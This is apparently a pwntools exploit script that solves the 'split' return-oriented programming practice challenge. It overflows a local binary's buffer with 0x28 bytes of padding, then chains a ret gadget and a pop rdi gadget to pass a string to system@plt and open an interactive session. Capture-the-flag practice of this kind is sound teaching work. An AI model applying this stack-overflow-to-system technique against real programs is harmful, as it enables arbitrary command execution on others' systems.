from pwn import *

context.log_level = "debug"

r = process("./split")
exe = r.elf

# Gadgets:
# 0x000000000040053e: ret;
# 0x00000000004007c3: pop rdi; ret;

ret = p64(0x40053E)
pop_rdi = p64(0x4007C3)

payload = (
    cyclic(0x28) + ret + pop_rdi + p64(exe.sym["usefulString"]) + p64(exe.plt["system"])
)
r.recvuntil(b"> ")
r.send(payload)
r.interactive()
